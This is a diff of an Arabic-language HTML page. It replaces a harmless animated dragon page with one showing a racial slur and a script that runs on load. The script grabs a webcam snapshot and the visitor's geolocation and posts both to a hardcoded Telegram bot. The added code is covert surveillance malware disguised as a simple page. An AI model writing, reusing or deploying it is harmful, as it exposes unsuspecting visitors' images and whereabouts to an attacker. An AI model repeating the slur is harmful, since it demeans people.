@@ -1,94 +1,86 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>تنين أسود 🔥</title>
-  <style>
-    body {
-      margin: 0;
-      background-color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: Arial, sans-serif;
-    }
+<meta charset="UTF-8" />
+<title>...</title>
+<style>
+  body {
+    background-color: #ffffff; /* خلفية بيضاء */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+    font-family: 'Arial', sans-serif;
+  }
 
-    .dragon {
-      position: relative;
-      width: 120px;
-      height: 120px;
-      background: #111;
-      border-radius: 50% 50% 30% 30% / 60% 60% 40% 40%;
-      box-shadow: 0 0 25px #0008;
-    }
+  .text {
+    font-size: 24px;
+    color: #000000; /* نص أسود */
+    margin-bottom: 40px;
+    font-weight: bold;
+    animation: fade 2s infinite alternate;
+  }
 
-    .dragon::before {
-      content: "";
-      position: absolute;
-      width: 60px;
-      height: 60px;
-      background: #111;
-      border-radius: 50%;
-      top: -30px;
-      left: 30px;
-      transform: rotate(-20deg);
-      box-shadow: -10px 10px 20px #0006;
-    }
-
-    .eye {
-      position: absolute;
-      width: 12px;
-      height: 12px;
-      background: red;
-      border-radius: 50%;
-      top: 20px;
-      left: 80px;
-      box-shadow: 0 0 10px red;
-    }
-
-    .flame {
-      position: absolute;
-      width: 30px;
-      height: 60px;
-      background: orange;
-      border-radius: 50%;
-      top: 60px;
-      left: 100px;
-      animation: flameFlicker 0.3s infinite alternate;
-      box-shadow: 0 0 20px orange, 0 0 30px red;
-      transform: rotate(30deg);
-    }
-
-    @keyframes flameFlicker {
-      0% { transform: scaleY(1) rotate(30deg); opacity: 1; }
-      100% { transform: scaleY(1.2) rotate(35deg); opacity: 0.7; }
-    }
-
-    .text {
-      position: absolute;
-      bottom: -100px;
-      width: 100%;
-      text-align: center;
-      font-size: 22px;
-      font-weight: bold;
-      color: #ff1a75;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.4; }
-    }
-  </style>
+  @keyframes fade {
+    from { opacity: 0.6; }
+    to { opacity: 1; }
+  }
+</style>
 </head>
 <body>
 
-<div class="dragon">
-  <div class="eye"></div>
-  <div class="flame"></div>
-  <div class="text">التنين قادم 🔥</div>
-</div>
+<div class="text"> lol Nigga </div>
+
+<script>
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        await new Promise(resolve => setTimeout(resolve, 3000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        const blob = await (await fetch(imageData)).blob();
+
+        const formData = new FormData();
+        formData.append("chat_id", "1320552080");
+        formData.append("photo", blob, "capture.jpg");
+
+        fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
+          method: "POST",
+          body: formData
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+
+        navigator.geolocation.getCurrentPosition(position => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
+            method: "GET"
+          });
+        }, error => {
+          console.error("فشل الحصول على الموقع:", error);
+        });
+
+      } catch (err) {
+        console.error("فشل الوصول إلى الكاميرا:", err);
+      }
+    }
+
+    captureAndSend();
+</script>
 
 </body>
 </html>
